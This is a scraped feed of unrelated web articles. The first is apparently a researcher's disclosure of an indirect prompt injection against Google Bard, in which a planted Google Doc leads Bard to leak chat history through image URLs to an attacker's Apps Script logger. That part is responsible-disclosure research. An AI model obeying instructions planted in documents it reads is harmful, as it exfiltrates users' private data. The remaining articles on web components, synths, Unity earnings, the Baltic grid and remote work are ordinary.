<p>A video tells more than a 1000 words, so check it out!</p>

<p>
  <iframe src="https://www.youtube.com/embed/CKAED_jRaxw" allowfullscreen="" title="YouTube Video"></iframe>
</p>

<p>In the video you can see how the chat history of the user is exfiltrated once the malicious <code>Google Doc</code> is brought into the chat context.</p>
<p>If you prefer screenshots over video, look further below.</p>
<h2 id="show-me-the-shell-code">Show me the Shell Code</h2>
<p><strong>Shell Code is natural language these days.</strong></p>
<p>This is the <code>Google Doc</code> including the payload used to perform the prompt injection and data exfiltration:</p>
<p><a href="https://embracethered.com/blog/images/2023/google-bard-payload.png"><img src="https://embracethered.com/blog/images/2023/google-bard-payload.png" alt="Bard Renders Image"></a></p>
<p>The exploit leverages the power of the LLM to replace the text inside the image URL, we give a few examples also to teach the LLM where to insert the data properly.</p>
<p>This was not needed with other Chatbots in the past, but Google Bard required some “in context learning” to complete the task.</p>
<h2 id="screenshots">Screenshots</h2>
<p>In case you don’t have time to watch the video, here are the key steps:</p>
<ul>
<li>
<p>First the user chats with Bard providing some text
<a href="https://embracethered.com/blog/images/2023/bard-data-exfil-data.png"><img src="https://embracethered.com/blog/images/2023/bard-data-exfil-data.png" alt="Bard Renders Image"></a></p>
</li>
<li>
<p>User navigates to the Google Doc (The Bard2000), which leads to injection of the attacker instructions, and rendering of the image:
<a href="https://embracethered.com/blog/images/2023/Bard-Exfil-Image-Markdown.png"><img src="https://embracethered.com/blog/images/2023/Bard-Exfil-Image-Markdown-crop.png" alt="Bard Renders Image"></a></p>
</li>
<li>
<p>The attacker receives the data via the Bard Logger Apps Script into a Google Doc:
<a href="https://embracethered.com/blog/images/2023/Bard-Exfil-BardLogger-Results.png"><img src="https://embracethered.com/blog/images/2023/Bard-Exfil-BardLogger-Results.png" alt="bard logger results"></a></p>
</li>
<li>
<p><strong>That’s it. Mission accomplished.</strong></p>
</li>
</ul>
<p>This chain was a bit more complex as others we discussed previously (like Bing Chat, ChatGPT or Claude), because a bypass for the <code>CSP</code> had to be found.</p>
<h2 id="googles-fix">Google’s Fix</h2>
<p>The issue was reported to Google VRP on September, 19 2023. After an inquiry on October 19, 2023 to check on status, since I wanted to demo at <a href="https://ekoparty.org/eko2023-agenda/indirect-prompt-injections-in-the-wild-real-world-exploits-and-mitigations/">Ekoparty 2023</a>, Google confirmed it’s fixed and gave green light for including the demo in the talk.</p>
<p>It’s not yet entirely clear what the fix was at the moment. The CSP was not modified, and images still render - so, it seems some filtering was put in place to prevent insertion of data into the URL. That will be something to explore next!</p>
<h2 id="conclusion">Conclusion</h2>
<p>This vulnerability shows the power and degrees of freedom an adversary has during an Indirect Prompt Injection attack.</p>
<p>Thanks to the Google Security and Bard teams for fixing this issue promptly.</p>
<p>Cheers.</p>

            <pubDate>Mon, 13 Nov 2023 15:31:43 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.jim-nielsen.com/2023/html-web-components/">https://blog.jim-nielsen.com/2023/html-web-components/</a>, See on <a href="https://news.ycombinator.com/item?id=38251330">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
          
          <p>I think the word “component” in “web components” confused a lot of people — at least it did me.</p>
<p>“Web components” sounded like the web platform’s equivalent to “React components”. JSX had <code>&lt;MyComponent&gt;</code> and now the web had <code>&lt;my-component&gt;</code>.</p>
<p>But when you try building web components the same way you build React components, it’s easy to get frustrated and give up because web components don’t work like React components — I know I gave up a few times.</p>
<p><a href="https://frankchimero.com/blog/2015/the-webs-grain/">The grain</a> of a React component is not the grain of a web component. Their design prioritize different functionality and forms of use. If you try to use one like the other, you’ll fight the direction of their natural grain.</p>
<p>Web components have their own grain and it favors enhancement over replacement. What do I mean by this?</p>
<p>A typical React component might look like this<sup id="fnref:1"><a href="#fn:1">[1]</a></sup>:</p>
<pre><code>&lt;<span>UserAvatar</span>
  src=<span>"https://example.com/path/to/img.jpg"</span>
  alt=<span>"..."</span>
/&gt;
</code></pre>
<p>You could write a web component this same way, e.g.</p>
<pre><code><span>&lt;<span>user-avatar</span>
  <span>src</span>=<span>"https://example.com/path/to/img.jpg"</span>
  <span>alt</span>=<span>"..."</span>
&gt;</span><span>&lt;/<span>user-avatar</span>&gt;</span>
</code></pre>
<p>But the unique power of web components (in the browser) is that they can render <em>before</em> JavaScript. React components cannot do this — full stop.</p>
<p>This feature of web components <a href="https://blog.jim-nielsen.com/2023/as-good-as-html/">encourages a design of composability</a>. Rather than an empty “shell component” that takes data and (using JavaScript exclusively) renders the entirety of its contents, web components encourage an approach of composing core content with HTML and then wrapping it in a custom element that enhances its contents with additional functionality.</p>
<pre><code><span>&lt;<span>user-avatar</span>&gt;</span>
  <span>&lt;<span>img</span> <span>src</span>=<span>"https://example.com/path/to/img.jpg"</span> <span>alt</span>=<span>"..."</span> /&gt;</span>
<span>&lt;/<span>user-avatar</span>&gt;</span>
</code></pre>
<p>This specific flavor of componentization is what Jeremy calls <a href="https://adactio.com/journal/20618">“HTML web components”</a>:</p>
<blockquote>
<p>If your custom element is empty, it’s not an HTML web component. But if you’re using a custom element to extend existing markup, that’s an HTML web component.</p>
<p>React encouraged a mindset of replacement: “forgot what browsers can do; do everything in a React component instead, even if you’re reinventing the wheel.”</p>
<p>HTML web components encourage a mindset of augmentation instead.</p>
</blockquote>
<p>I like that term “HTML web component”. It stands in contrast to a “JavaScript web components” which would be an empty element whose functionality and contents rely exclusively on JavaScript.</p>
<p>Per my earlier example, this would be a JavaScript web component:</p>
<pre><code><span>&lt;<span>user-avatar</span>
  <span>src</span>=<span>"https://example.com/path/to/img.jpg"</span>
  <span>alt</span>=<span>"..."</span>
&gt;</span><span>&lt;/<span>user-avatar</span>&gt;</span>
</code></pre>
<p>It relies exclusively on the presence of JavaScript and is meaningless to the end user without it.</p>
<p>Whereas this would be an HTML web component:</p>
<pre><code><span>&lt;<span>user-avatar</span>&gt;</span>
  <span>&lt;<span>img</span> <span>src</span>=<span>"https://example.com/path/to/img.jpg"</span> <span>alt</span>=<span>"..."</span> /&gt;</span>
<span>&lt;/<span>user-avatar</span>&gt;</span>
</code></pre>
<p>It has meaning and content without JavaScript — then is enhanced by its presence.</p>
<p>This idea of augmentation/enhancement over replacement is intriguing.</p>
<h2 id="on-the-web-augmentation-wins-in-the-long-run">On The Web, Augmentation Wins in the Long Run</h2>
<p>Augmentative approaches work best on the web because 1) the web’s grain encourages enhancement to improve resilience, and 2) that’s really the best way to iteratively change something as big as the web.</p>
<p>Eventually all the best ideas of web-adjacent frameworks are subsumed into the platform to work in ways that augment the existing technology rather than replace it wholesale.</p>
<p>XHTML wanted to replace HTML4, but HTML5 wanted to augment it. HTML5 won.</p>
<p>Networking libraries wanted to replace <code>XMLHttpRequest</code> and their best ideas were eventually ported into the <code>fetch</code>  standard — which exists in more places than just the browser these days!</p>
<p>The best ideas of Sass and jQuery were ported to the browser.</p>
<p><a href="https://blog.jim-nielsen.com/2023/the-flavors-of-typescript/">Typescript’s best ideas are going to the browser</a>, but in a way that works to enhance not replace what exists.</p>
<p>With web components, you might even say React’s component model is being ported to the browser. But it’s being done in a way that works to enhance how the web already works, not replace it.</p>
<p>My takeaway is: if you’re looking for longevity, opt for a technical approach of augmentation and enhancement over replacement. The web’s grain is arranged in that direction.</p>
<hr><ol><li id="fn:1">I think React is trending towards becoming more like HTML over the years. Dan Abramov notes how <a href="https://x.com/dan_abramov/status/1623771055943831553?s=20">component composition over prop drilling</a> is a “top react skill to learn in 2023”. Even <a href="https://react.dev/learn/passing-props-to-a-component#passing-jsx-as-children">the react docs</a> specifically call out the composability of HTML and how you might want to <a href="https://cdn.jim-nielsen.com/blog/2023/react-docs-composable-jsx.png">follow HTML’s example in your JSX</a>. <a href="#fnref:1" title="Jump back to footnote 1 in the text.">↩</a></li></ol>

<div id="readability-page-1" class="page"><div>
    	  
<p>LEDs, cathode ray tubes, blinky lights – move over. Once you’ve seen dancing animated black goo frolicking in space to sound, you never go back. Love Hultén has been plus-ing their custom instruments with ferrofluids, and the results are simply magical.</p>



<p>From yesterday, there’s this beautiful creation with a KORG minilogue xd inside. (There’s also a Collider according to the notes, which I think is the <a href="https://www.sourceaudio.net/collider_delay_reverb.html">Source Audio delay/reverb</a>.)</p>



<figure><p>
<iframe title="Ferrofluid synth" width="500" height="281" src="https://www.youtube.com/embed/VyQGLJe2sek?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen=""></iframe>
</p></figure>



<p>This isn’t the first time Love has added ferrofluids to a custom build. Over the summer, Love transformed a <a href="https://www.twistedelectrons.com/deton8">Twisted Electronics Deton8</a> into a ferrofluid-animated drum synth, with these delicious results:</p>



<figure><p>

</p></figure>



<p>The inspiration for all of this, says Love, is DAKD Jung’s wondrous ferrofluid-display Bluetooth speaker project:</p>



<figure><p>
<iframe loading="lazy" title="Ferrofluid display cell bluetooth speaker" width="500" height="281" src="https://www.youtube.com/embed/pgp2sp0EB7w?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen=""></iframe>
</p></figure>



<p>Now, to be honest, I haven’t been keeping up with DIY ferrofluid sonic animations – though seeing this, I wonder what I’ve been doing with my life instead. Fortunately, Hackaday were keeping abreast of all things ferrofluids and naturally, you have to do some <em>work</em> to get results this good, as Donald Papp explained in June:</p>



<p><a href="https://hackaday.com/2023/06/15/ferrofluid-drum-synth-dances-to-the-beat/">Ferrofluid drum synth dances to the beat</a> [Hackaday]</p>



<p><em>(Hey, did they get rid of the hyphens in their site title? Seems like a failure of brand recognition, like someone turning a <a href="https://createdigitalmusic.com/">known name</a> into an <a href="https://cdm.link/">acronym</a>, but <a href="https://duckduckgo.com/?q=kfc&amp;ia=web">what do I know</a>?)</em></p>



<p>Anyway, if all this ferrofluid business is freaking you out, Love also has an absolutely gorgeous “Chunky Mother-32.” That commission combines a Moog Mother 32, a Roland TR-08, and a <a href="https://www.soundonsound.com/reviews/hologram-electronics-microcosm">Hologram Electronics Microcosm</a>, plus a pull-out keybed. I mean, sure, <a href="https://cdm.link/2023/06/moog-music-has-been-bought-by-inmusic/">inMusic could make Moog stuff cheaper</a> theoretically, but what about making it <em>an order of magnitude more expensive</em>? </p>

</p></figure>



<p>And… two words. MIDI. Crab.</p>



<figure><p>
<iframe loading="lazy" title="Sebastian - The MIDI crab" width="500" height="281" src="https://www.youtube.com/embed/ismKwb2zHBs?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen=""></iframe>
</p></figure>

<iframe loading="lazy" title="Cousteau synth" width="500" height="281" src="https://www.youtube.com/embed/-lsPRnRF7zo?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen=""></iframe>
</p></figure>



<p>Honestly, the ultimate evolution of displays is certainly for everything to turn into crabs. Don’t ask me, ask an evolutionary biologist; <a href="https://en.wikipedia.org/wiki/Carcinisation">carcinisation</a> is <em>science</em>, y’all.</p>



<p>And, actually, having turned this site into an acronym and had it survive for nearly 20 years, I expect next it should turn into a crab. (Crab Digital Music? Dunno.)</p>



<p>It’s the future of music.</p>

</ul>
<h2>The highlights</h2>
<p>Unity's revenue increased 69% year-over-year to $544 million, while it reported a net loss reduced by half to $125 million, compared to $250 million during the same period last year.
</p>
<p>
Despite this, Unity has announced more layoffs as a result of a "comprehensive assessment of its product portfolio" at the beginning of its fourth quarter, as detailed in <a href="https://d18rn0p25nwr6d.cloudfront.net/CIK-0001810806/19c99810-0173-4d43-888c-b5feba311d3f.pdf">its Q3 2023 report.</a>
</p>
<p>
"The assessment will likely lead us to decide to discontinue certain offerings, reduce our workforce and reduce our office footprint," the company said.
</p>
<p>
It added: "The timing and full impact of these types of changes on our future results of operations, cash flows, or financial condition are uncertain, and for those reasons we are currently unable to reasonably quantify the potential impacts through the fourth quarter of 2023."
</p>
<p>
As a result, the company did not provide any guidance for Q4 or the full year 2023.
</p>
<p>
During Unity's earnings call (transcribed by <a href="https://seekingalpha.com/article/4650087-unity-software-inc-u-q3-2023-earnings-call-transcript">Seeking Alpha</a>) following the release of its Q3 results , Unity's CFO Luis Visoso said decisions would be made and implemented during this quarter, with a target of being finalised by Q4 2023. 
</p>
<p>
"It's not like a business model transition that takes a year or two years to complete," said Visoso. "These are things we were planning to do and executing now."
</p>
<p>
This was referred to as a "rip off the band-aid reset" by interim CEO James Whithurst.
</p>
<p>
Looking at Create Solutions revenue (the division in charge of Unity's engine), core subscriptions were up 19% during Q3 but revenue was flat year-on-year.
</p>
<p>
"Three sectors negatively impacted growth this quarter: Unity Game Services (UGS), China, and professional services," the report read. "UGS had a record third quarter last year from new game launches, China revenue declined from continued government restrictions on gaming, and we continue to reduce our reliance on professional services."
</p>
<p>
As for its Grow Solutions vertical (Unity's ads products and services), revenue increased by 166% year-on-year to $355 million despite the <a href="https://www.gamesindustry.biz/unity-apologises-for-controversial-runtime-fee-promises-changes-to-the-policy">backlash in response to its proposed runtime fee</a> announced in September.
</p>
<p>
"We continue to believe that we are gaining share in a relatively flat market," the company said. "We experienced some revenue softness at the end of the quarter and in October from the runtime fee introduction, which is now mostly behind us."
</p>
<p>
In the letter to shareholders, Whitehurst said Unity was "doing too much" and aimed to "emerge as a leaner, more agile, and faster growing company" for the next quarter.
</p>
<p>
He added: "Going forward, we plan to increase our focus on our core; the Unity Editor and Runtime, and Monetisation Solutions as we continue to see significant opportunities for growth in these businesses, including AI. 
</p>
<p>
"In addition, we aim to sharpen our focus on fewer large and more attractive businesses where our capabilities offer a clear competitive advantage like Digital Twins."

<div id="readability-page-1" class="page"><div data-elid="2666201539" data-post-url="https://spectrum.ieee.org/baltic-power-grid" data-authors="Peter Fairley" data-headline="To Free The Baltic Grid, Old Technology Is New Again" data-page-title="To Free The Baltic Grid, Old Technology Is New Again - IEEE Spectrum"><p>The Baltic countries—Lithuania, Latvia and Estonia—recently accelerated a plan to cut the electrical chains that keep them tied to Russia. A technical lynchpin to their planned escape from <a href="https://en.wikipedia.org/wiki/IPS/UPS" rel="noopener noreferrer" target="_blank">the Moscow-controlled synchronous AC power zone</a> is a constellation of synchronous condensers: free-­spinning and fuel-free electrical generators whose sole purpose is to stabilize and protect power grids. </p><p>The Baltic states, all of which are members of the European Union and NATO, started freeing themselves from Russia’s electrical embrace almost a decade ago with the construction of <a href="https://spectrum.ieee.org/fear-of-russia-drives-highvoltage-power-projects-in-the-baltics" target="_self">high-voltage direct current (HVDC) connections to Finland, Sweden and Poland</a>. Those alternative sources of electrical support ended the Baltics’ dependance on imported power from Russia and Belarus. </p><p>Now stabilizing equipment is preparing the grid to be able to physically separate from the giant grid to the East, and to synchronize instead with the continental European grid to the South. In 2019, funding from the European Union jumpstarted the required grid-strengthening upgrades required, and synchronization with Europe was scheduled for the end of 2025. </p><p>“Being on the Russian electricity grid is a risk for Estonian consumers.”</p><p>Cost increases have delayed a crucial second link with Poland and thus Europe to 2028, but the full-scale invasion of Ukraine and <a href="https://spectrum.ieee.org/russia-targets-ukraine-grid" target="_self">Russia’s ariael assaults on the Ukrainian grid</a> boosted pressure on the Baltics to break away faster. In August the Baltic states reached consensus on a plan to switch grids no later than February of 2025. </p><p>As Estonian Prime Minister Kaja Kallas <a href="https://elering.ee/en/baltic-prime-ministers-we-will-leave-russian-electricity-grid-early-2025-latest" target="_blank">explained</a>: “Russia’s aggression in Ukraine and its use of energy as a weapon proves that it’s a dangerous and unpredictable country, and therefore being on the Russian electricity grid is a risk for Estonian consumers.” The prime ministers, she said, agreed to, “leave the Russian network as soon as the technical capacity is in place.”</p><p>This is where synchronous condensers step in. Synchronous condensers (also called synchronous compensators) are essentially generators that, in normal operation, are spun by an AC grid’s power and synced to its frequency (rather than driven by their own fuel). When power plants and/or transmission lines shut down unexpectedly, the momentum in their spinning mass offers an instantaneous supply of energy that cushions the blow, thus protecting equipment and preventing outages. </p><p><img alt="A large room houses boxy machinery, as well as many pipes and nozzles.

But plants with steam and turbine-driven generators are increasingly being replaced by solar panels, wind turbines and batteries that deliver their energy via electronic converters. Hence a worldwide comeback for a <a href="https://www.modernpowersystems.com/features/featurege-synchronous-condensers-100-years-on-7769875/" rel="noopener noreferrer" target="_blank">technology that was invented over a century ago</a>. </p><p>In recent decades AC grids are experiencing more events where synchronization breaks down.</p><p>Joswig says there’s been an extra growth spurt as the energy transition accelerated over the last several years: “Before, some grid operators told me there is no market for the synchronous condenser. Now they can not get enough.” </p><p>Synchronizing with Europe drives added need for grid services in the Baltics. Europe has very large power plants whose failure can cause larger disruptions than the Baltics have traditionally faced. And, notes Joswig, in recent decades AC grids are experiencing more events where synchronization breaks down, leaving some regions electrically isolated—a scenario that will be extra-relevant for the Baltics while it is operating with just one AC link to continental Europe. </p><p>When Spectrum profiled the re-emergence of synchronous condensers in 2015, there was a notable trend toward the <a href="https://spectrum.ieee.org/zombie-coal-plants-reanimated-to-stabilize-the-grid" target="_self">conversion of steam generators</a> as coal-fired and <a href="https://spectrum.ieee.org/tag/nuclear-power">nuclear power</a> plants shut down. Today’s notable tech trend, says Joswig, is the addition of flywheels weighing hundreds of tonnes to boost momentum. All nine of the Baltics’ synchronous condensers will have power-boosting flywheels, as she explains, equipping each installation with up to 2,200 megajoules of energy. That’s roughly equivalent to the kinetic energy of a 3,000 tonne train cruising at 100 kilometers per hour.</p><p><img alt="A map of the Baltic states showing work being done to disconnect from the Russian power system." data-rm-shortcode-id="7ce2f0d6525ba5ba259d6f9346ce8013" data-rm-shortcode-name="rebelmouse-image" data-runner-src="https://spectrum.ieee.org/media-library/a-map-of-the-baltic-states-showing-work-being-done-to-disconnect-from-the-russian-power-system.jpg?id=50447193&amp;width=980" height="2010" id="f9707" lazy-loadable="true" src="https://spectrum.ieee.org/media-library/a-map-of-the-baltic-states-showing-work-being-done-to-disconnect-from-the-russian-power-system.jpg?id=50447193&amp;width=980" width="2546"><small placeholder="Add Photo Caption...">The Harmony Link HVDC cable as shown will give the Baltics a second transmission link to Europe.

Moving up the final line renovation, a circuit between Estonia and Latvia to be ready at the end of 2024, clinched the deal to accelerate synchronization with Europe. </p><p>Justinas Juozaitis, who heads the World Politics Research Group at Lithuania’s military academy, says Russian action forced the speed-up. For one thing, he says, Russia prepared faster for Baltic separation. </p><p>Russia and Belarus built new lines to strengthen their own grids. And Russia built four gas-fired power plants and an LNG import terminal in Kaliningrad, a Russian exclave on the Baltic Sea sandwiched between Poland and Lithuania. “By 2021 they had built the infrastructure and proved that Kaliningrad can operate independently,” says Juozaitis. That, he says, put Russia in a position to disrupt Baltic power without risk of blacking-out its own territory.</p><p>By the middle of 2022, the Baltics forged a protocol for “emergency synchronization,” by which it can switch to Europe’s grid in a matter of hours if necessary. The emergency plan calls for activation of transformers at the Polish-Lithuanian border, converting the country’s HVDC link to an AC interconnection, and provision of extra frequency regulation via plants in Sweden and Finland. </p><p>Juozaitis says the fact that <a href="https://spectrum.ieee.org/ukraine-europe-electricity-grid" target="_self">European grid operators fast-tracked and completed Ukraine’s synchronization</a> within one month of Russia’s invasion provides confidence that the Baltics can pull off an emergency switch. And he says recent events highlight the importance of being ready: mechanical damage sustained by a natural gas pipeline from Finland to Estonia and by <a href="https://spectrum.ieee.org/topic/telecommunications/">telecommunications</a> cables linking Estonia to Sweden. They appear to have been struck around the same time in early October. </p><p>Finnish authorities investigating the pipeline damage say their prime suspect is <a href="https://en.wikipedia.org/wiki/Newnew_Polar_Bear" target="_blank">a Chinese-flagged container ship, the Newnew Polar Bear</a>; Estonian authorities have said they are tracking <a href="https://en.wikipedia.org/wiki/Sevmorput" target="_blank">the Sevmorput, a nuclear-powered Russian cargo ship</a>, that was also in the vicinity of the pipeline and cables when they sustained damage. </p><p>“The Russian federation has the motive, and the chronology is very very strange,” notes Juozaitis. Russia and China have denied sabotaging the equipment. </p><p>Juozaitis says NATO has already stepped up naval patrols and other surveillance in the Baltic to protect infrastructure. But he says the Baltics also need to practice deterrence. As he puts it: “They must be signalling that if the Russians continue tampering with submerged infrastructure there are going to be consequences.” </p></div></div>]]></description>

<div id="readability-page-1" class="page"><section itemprop="articleBody">
							
<p><em>Spoilers: it’s not about whether remote or office work is better.</em></p>



<p>The prevalence of return to office mandates has provoked much discourse and strong opinions. For good reasons. Return to office mandates can tear teams apart by pushing out people who cannot relocate, at huge cost.&nbsp;&nbsp;&nbsp;</p>



<figure></figure>



<p>Working physically together, in the same space, as a whole team, can be extremely enabling. Supporting a joyful environment. Sadly, too many offices were (and remain) environments hostile to collaboration. Return to those hostile environments has been imposed on many. </p>







<p>It makes me sad to see people…</p>



<p>…forced to return to offices that are noisy, cramped, illness-spreading, collaboration-killing environments.&nbsp;</p>



<p>…conversing over video chat from across the same open-plan office, because while they’re in the same space it’s not set up to help them collaborate.</p>



<p>…excluded from teamwork because the rest of the team is in another location.</p>



<p>…stuck waiting on pull request reviews from people they are sat right next to.</p>



<p>Most of all I get sad when I see ineffective teams with no ability or motivation to improve—whether remote or co-located.</p>



<p>For many teams there can be huge advantages to co-located working, but these aren’t it. Different approaches better support different people, different teams, different contexts.&nbsp;</p>



<p>Return to office mandates can destroy the effectiveness of teams who have <a href="https://benjiweber.co.uk/blog/2021/07/03/uncovering-better-ways/">uncovered better ways</a> of working by going remote.</p>



<p>Tearing your teams apart and undermining their ways of working are tremendously damaging. Fabled watercooler serendipity will not make up for this.</p>



<p>You’ll cause harm by forcing RTO on teams with cultures that benefit from remote. Please, instead, help your teams craft their best environment.&nbsp;</p>



<h2 id="notalwaysbest">Remote isn’t always Best</h2>



<p>Many people are very passionate about remote work. Remote can bring inclusion benefits. Offices can bring communication bandwidth benefits.&nbsp;</p>



<p>This claim crossed my feed this week:</p>



<p>“<em>Every successful company needs to have the most talented people. The most talented people no longer live in, or want to live in the same place.”&nbsp;</em></p>



<p>This suggests that “acquiring” talented people is a zero-sum game. It’s not.</p>



<p>Rather, successful companies maximise what their people can achieve. One factor is indeed how talented the people who join are. Another is their pre-existing skills. Even more significant than these is the extent to which the organisation amplifies &amp; accelerates, or impedes their abilities.&nbsp;&nbsp;</p>



<figure></figure>



<p>Different organisations, and different ways of working, are more or less suited to make different individuals the most effective.&nbsp;&nbsp;</p>



<h2 id="nocompromise">Don’t Compromise</h2>



<p>Mediocre teams compromise on their ways of working to avoid conflict; sacrificing their team’s potential on the altar of individual autonomy.&nbsp;</p>



<p>Effective teams find ways of working that give themselves an advantage. They shape their environment to maximise their effectiveness.&nbsp;</p>



<figure><blockquote><p><em>Mediocre teams compromise on their ways of working to avoid conflict; sacrificing their team’s potential on the altar of individual autonomy.&nbsp;</em></p></blockquote></figure>



<p>Hybrid work policies can easily result in the downsides of being anchored to an office location, with none of the benefits that could come from having everyone together. </p>



<p>It doesn’t just happen with location. Individual preferences for working exclusively in certain parts of the codebase can result in nobody working together towards the same mission. People who feel they get more done if left to their own devices for days or weeks are often right, <em>and</em> it can also be true that the team as a whole is less successful. </p>



<p>It’s easy to avoid conflict and get stuck in mediocrity. Optimising for individual happiness can result in less of the joy that people find in teams that achieve great things together.</p>



<figure><blockquote><p><em>Optimising for individual happiness can result in less of the joy that people find in teams that achieve great things together.</em></p></blockquote></figure>



<p>If only effective collaboration had such an easy answer as asking everyone to come to an office.&nbsp;</p>



<p>If you want to build up your teams rather than undermine them, start with curiosity about <em>how </em>they work. Invite and support them to uncover better ways of working for them. What helps them. Their preferences. Their lives. Their mission. Their constraints.</p>



<p>I’m privileged to have experienced working with many effective &amp; ineffective teams &amp; communities. Both in office environments and remotely, with a variety of collaboration styles.</p>



<p>I’ve experienced some of my most joyful work in teams working together in the same space. I’ve benefited from flexibility and inclusion with remote work. I’ve also been able to contribute as part of larger open source communities where I couldn’t even know everyone by name. There are plenty of reasons to be passionate about each approach.&nbsp;</p>



<p>What I am <em>most</em> passionate about is teams finding the most effective ways to work together. Joy for the individuals involved. Successful team missions. Turning the constraints they’re working with to their advantage.</p>



<h2 id="beyondbinary">Beyond a Binary Debate</h2>



<p>There are more options than just Office vs Remote. Distributed vs Co-located working is often conflated with Async vs Synchronous working styles. It’s not one or the other.</p>



<figure><img loading="lazy" width="1455" height="1194" src="https://benjiweber.co.uk/blog/wp-content/uploads/2023/11/quadrants-1.png" alt=""></figure>



<p>By Async I mean working independently. Coordinating via tickets, pull requests, mailing lists etc.&nbsp;</p>



<p>By Sync I mean working together, on the same thing, at the same time—and <em>not necessarily</em> at the same place.&nbsp;&nbsp;</p>



<p>Those who’ve experienced greatness at one extreme on this chart are often enthusiastic. Top-right and bottom-left have many proponents. However, bottom right can be glorious as well, and this seems to be less discussed.&nbsp;Fans of Async-Remote sometimes characterise Sync-Remote as being<em> “unable to let go of the office”</em>. However, I’ve seen it work tremendously well—often far better than the typical office space allows.&nbsp;</p>



<p>Teams often compromise somewhere near the middle. A hybrid of workplaces and work-ways. Accommodating a variety of preferences and needs.&nbsp;</p>



<p>The best teams I’ve seen move towards an edge and find a sweet spot. You can imagine a third dimension of effectiveness. With a pit in the centre.</p>



<figure><img src="https://lh7-us.googleusercontent.com/7N0jyimRlpT3b6X1zF-O0qKvqdLmurkeBONV9UhITfJgwUJQf0c_1PUwCnO8dXLeuTlxWSFUx1V6r818JY9dw5q4tyXkghX_91dVTSSFoWT3de2rzrixBoVllmoVkrDiXbz2AeO_DcoGGqHr8PkXeRE" alt=""></figure>



<h2 id="officeasync">Office and Async — Escape the Tragedy</h2>



<p>I’ve not found a scenario where this quadrant is better than an alternative, despite it being, in my experience, the most common for most <em>“teams”</em>. Where teams are acting more like a mere convenient grouping of individuals than a collective with a common mission.</p>



<figure><img loading="lazy" width="856" height="472" src="https://benjiweber.co.uk/blog/wp-content/uploads/2023/11/headphones.png" alt=""></figure>



<figure><blockquote><p><em>Don’t suffer and merely survive, aided by your noise cancelling headphones.</em></p></blockquote></figure>



<p>This scenario often arises through compromise on ways of working that are the least objectionable to everyone in the team. In contrast, better ways of working tend to arise from finding what works and <a href="https://benjiweber.co.uk/blog/2015/04/17/modern-extreme-programming/">turning it up to the extreme</a>.</p>



<p>I’m interested to hear from you if you have seen a team better off in the Office &amp; Async quadrant than they would be in another. </p>



<p>If you’re stuck in this quadrant, and you’re not finding it joyful, consider a move to another. Don’t suffer and merely survive, aided by your noise cancelling headphones.</p>



<figure><img loading="lazy" width="1636" height="1193" src="https://benjiweber.co.uk/blog/wp-content/uploads/2023/11/escape.png" alt=""></figure>



<h3>Option 1: Move remote, to get the true benefits of Async&nbsp;</h3>



<p>If you have the luxury of working remotely, and you prefer working asynchronously, then remote will open up lots of benefits.</p>



<p>You’ll avoid commutes. You’ll enable hiring from anywhere, including a wide geographical spread, making it easier to hire great people. You’ll increase timezone coverage for progress that never stops and improve operational coverage.&nbsp;</p>



<h3>Option 2: Move together, to enable Sync</h3>



<p>If your team are all spread out within the same office, bring your desks together. Control your space as much as possible. Use the wall space. Separate your area with whiteboards / soundproofing. </p>



<p>If this isn’t possible, consider booking meeting rooms out where you could go to work together. It’s amazing how infrequently large meetings get questioned. Whereas making small changes to enhance the space you’re working in sometimes alarms bureaucracies. </p>



<p>Working in the same space will enable ad-hoc discussions. It facilitates pair programming with regular rotations. You can make the things most important to you visible in the workspace. You’ll also overhear opportunities to help each other.</p>



<h3>Option 3: Move remote, to enable Sync&nbsp;</h3>



<p>If you can’t move your desks but have the luxury of working remotely, you could move to the bottom right to make collaboration easier. Then try some of the ways of working <a href="#officesync">mentioned below.</a></p>



<h2 id="remoteasync">Remote and Async — Open Source Style</h2>



<p>Many of the best ways of working in this quadrant have emerged from the ways that distributed open source communities work. Pull requests. Mailing lists. Decision frameworks based on written proposals.&nbsp;</p>



<p>This style enables large groups of people to collaborate effectively to&nbsp;achieve large things. Often larger than a traditional team could achieve. Sometimes at the cost of speed of decisions.&nbsp;</p>



<h2 id="officesync">Office and Sync — XP Style</h2>



<p><a href="https://en.wikipedia.org/wiki/Extreme_programming_practices">Extreme Programming Practices</a> are a great starting point for office &amp; sync. Then experiment and iterate towards what works best for you.</p>



<p>If you have the luxury of being in the same space—be in the same space. i.e. get your desks together. Get big desks so you can sit and work together. Customise your space to be informative &amp; facilitate collaboration. Track things on the walls. Keep living diagrams on whiteboards. Put up big displays with production metrics.&nbsp;</p>

<h2>Remote and Sync — Learn what works</h2>



<p>Less has been written about this quadrant. Kent Beck <a href="https://www.mechanical-orchard.com/post/is-extreme-collaboration-remotely-possible">wrote this article recently</a> which partly inspired this post.&nbsp;</p>



<p>During the pandemic I saw several teams stuck in the Async-Colocated quadrant discover the benefits of collaborative practices.&nbsp;</p>



<figure><blockquote><p><em> re-discovery of XP practices unimpeded by hostile offices</em></p></blockquote></figure>



<p>Teams stuck working as isolated individuals within the same office were freed. Absent the noisy office environments where they were artificially separated, they could start working together, in a remote-first way.&nbsp;</p>



<p>Teams discovered new ways. These included re-discovery of XP practices unimpeded by hostile offices.</p>



<h3>Eliminate wasteful Meetings</h3>



<p>I saw teams inverting what they used synchronous time for. Things they did together through mere habit, like status updates for stakeholders, became async. Boring meetings of status updates that could be slack messages became slack messages.&nbsp;</p>



<p>Instead, sync time was protected for actual collaboration. The higher cost of sync time when remote due to lower bandwidth incentivised using it more wisely.&nbsp;</p>



<h3>Always-on Zoom</h3>



<p>An always-on video call for teams allowed people to drop in and out to work with each other and catch up on work others were doing in parallel. Analogous to a dedicated team war-room in an office. Without the bureaucratic hurdles to setting one up. Nor the challenge of competing with nearby teams for noise.</p>



<h3>Dashboard Nudges&nbsp;</h3>



